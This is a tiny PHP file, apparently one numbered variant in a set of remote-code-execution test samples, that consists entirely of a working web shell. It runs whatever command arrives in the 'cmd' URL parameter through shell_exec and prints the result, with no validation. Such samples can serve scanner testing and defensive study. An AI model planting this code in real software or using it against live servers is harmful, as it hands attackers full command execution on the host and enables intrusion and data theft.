<?php
// RCE test variation #390
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>